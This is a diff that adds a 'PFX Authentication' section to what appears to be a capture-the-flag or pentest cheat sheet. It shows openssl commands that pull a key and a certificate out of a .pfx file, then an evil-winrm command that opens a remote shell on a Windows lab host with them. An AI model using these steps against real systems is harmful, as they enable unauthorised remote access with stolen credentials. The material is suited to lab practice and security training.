@@ -27,3 +27,11 @@ EOF
 // Connect with TGT
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB                                                                                                               
 ```
+
+## PFX Authentication
+```
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+
+evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
+```
